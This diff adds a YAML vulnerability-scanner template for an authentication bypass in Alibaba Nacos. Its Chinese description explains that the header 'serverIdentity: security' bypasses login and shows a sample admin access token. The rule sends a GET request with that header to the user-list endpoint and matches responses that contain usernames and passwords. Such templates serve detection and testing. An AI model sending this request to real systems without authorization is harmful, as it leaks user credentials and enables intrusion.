@@ -1,0 +1,24 @@
+id: nacos-severidentity-bypass
+
+info:
+  name: Alibaba Nacos ServerIdentity 权限绕过
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Nacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略。Nacos 平台在 Header 中添加 serverIdentity: security 能直接绕过身份验证查看用户列表
+    {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ","tokenTtl":18000,"globalAdmin":true}
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/55e4dca8b537b93c6b90008af2f7eddd68271f2c/bugs/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E8%BF%BD%E8%BF%87%E7%9A%84%20Nacos.md
+  tags: nacos,bypass
+  created: 2023/07/14
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken=
+      headers:
+        serverIdentity: security
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+expression: r0()
